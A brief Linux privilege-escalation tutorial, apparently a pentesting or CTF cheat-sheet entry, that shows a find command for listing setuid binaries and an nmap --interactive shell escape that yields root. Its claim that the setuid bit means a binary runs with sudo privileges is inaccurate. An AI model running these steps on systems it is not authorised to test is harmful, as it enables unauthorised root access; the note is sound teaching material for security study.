```shell
find / -perm +6000 2>/dev/null | grep '/bin/'
```

This command will find a display paths to binaries that have the su bit set AKA can be run with sudo privileges.

For example you could find many essential system bins but also some bins will stick out like nmap for example.

Your next step is to go to gtfobins website and find what are the possible ways of using that binary (nmap) of escalating privileges.
In our case...
```shell
shell$ whoami
user

shell$ nmap --interactive

nmap_shell$ !sh

shell$ whoami
root
```